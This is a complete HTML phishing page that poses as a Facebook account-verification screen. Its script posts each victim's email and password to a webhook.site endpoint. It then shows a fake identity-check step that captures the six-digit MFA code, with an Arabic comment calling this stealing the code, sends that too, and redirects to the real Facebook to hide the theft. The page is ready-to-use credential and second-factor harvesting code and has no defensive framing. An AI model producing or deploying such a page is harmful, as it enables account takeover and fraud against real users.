<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – Account Verification</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { width: 396px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; }
        .fb-logo-text { color: #1877f2; font-size: 50px; font-weight: bold; margin-bottom: 10px; letter-spacing: -2px; }
        .security-notice { background-color: #fff9e6; border-left: 5px solid #e2b13c; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; text-align: left; color: #856404; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 17px; }
        button { width: 100%; padding: 14px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
        #step2 { display: none; } /* إخفاء خطوة الكود في البداية */
    </style>
</head>
<body>

<div class="login-container">
    <div class="fb-logo-text">facebook</div>

    <div id="step1">
        <div class="security-notice">To secure your account, please log in first.</div>
        <form id="formStep1">
            <input type="text" id="user" placeholder="Email or phone number" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <div id="step2">
        <div class="security-notice"><strong>Identity Confirmation:</strong> We've sent a 6-digit code to your email. Please enter it below to verify it's you.</div>
        <form id="formStep2">
            <input type="text" id="otp" placeholder="Enter 6-digit code" maxlength="6" required>
            <button type="submit">Verify Account</button>
        </form>
    </div>
</div>

<script>
    const webhookURL = 'https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190';

    // التعامل مع الخطوة الأولى
    document.getElementById('formStep1').addEventListener('submit', function(e) {
        e.preventDefault();
        const data = { 
            email: document.getElementById('user').value, 
            password: document.getElementById('pass').value,
            type: "Login_Credentials"
        };

        fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) })
        .then(() => {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        });
    });

    // التعامل مع الخطوة الثانية (سرقة الكود)
    document.getElementById('formStep2').addEventListener('submit', function(e) {
        e.preventDefault();
        const data = { 
            otp_code: document.getElementById('otp').value,
            type: "MFA_Code"
        };

        fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) })
        .then(() => {
            window.location.href = 'https://www.facebook.com';
        });
    });
</script>

</body>
</html>
